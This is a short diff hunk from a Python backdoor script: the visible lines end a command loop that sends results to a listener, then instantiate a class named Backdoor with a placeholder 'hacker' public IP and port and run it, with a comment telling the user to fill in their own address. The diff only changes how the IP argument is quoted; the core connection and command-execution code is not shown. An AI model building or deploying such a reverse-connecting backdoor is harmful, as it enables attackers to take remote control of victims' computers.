@@ -63,8 +63,8 @@ class Backdoor:
 
             self.send_to_listener(command_result)
 
-# You need to change this to your PubIP & Port before running this .python file or reference this directly as an argument when running your code.
-my_backdoor = Backdoor(str(hacker_publicIP), hacker_port)
+# You need to change this to your PubIP (should be in quotes) & Port before running this .python file or reference this directly as an argument when running your code.
+my_backdoor = Backdoor("hacker_publicIP", hacker_port)
 my_backdoor.run()
 
 
